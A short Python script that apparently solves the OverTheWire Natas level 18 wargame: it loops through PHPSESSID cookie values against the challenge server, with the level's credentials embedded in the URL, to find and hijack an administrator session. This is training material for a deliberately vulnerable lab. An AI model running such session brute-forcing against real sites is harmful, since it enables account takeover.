import requests
address = "http://natas18:xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP@natas18.natas.labs.overthewire.org"
maxID = 640
pwd = ""

for i in range(0, maxID):
	cookie = {'PHPSESSID': str(i)}
	r = requests.get(address, cookies=cookie)
	if "You are logged in as a regular user." not in r.text:
		print(r.text)
		break
